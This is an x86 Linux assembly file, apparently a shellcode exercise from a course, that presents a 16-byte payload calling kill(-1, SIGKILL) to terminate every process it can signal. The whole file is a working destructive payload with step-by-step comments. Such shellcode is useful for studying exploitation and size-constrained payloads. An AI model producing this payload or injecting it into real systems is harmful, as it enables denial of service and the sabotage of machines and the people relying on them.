; By  SLAE - 1459 10 april 2019

;16 byte shellcode to kill all processes for Linux/x86

section .text

	global _start

_start:

; kill(-1, SIGKILL)

	xor eax, eax	; clear registers
     	xor ebx, ebx	

	mov al, 0x20	; mov 32 to eax
	add al, 0x05	; add 5 to eax
			; end with 37 the kill syscall code
	mov bl, 0x01	; mov 1 to ebx
	neg ebx		; ebx = -1

	mov cl, 0x09	; ecx = 9
			; Note it's better to clear ecx before
			; but due the size limitations just mive it
	int 0x80


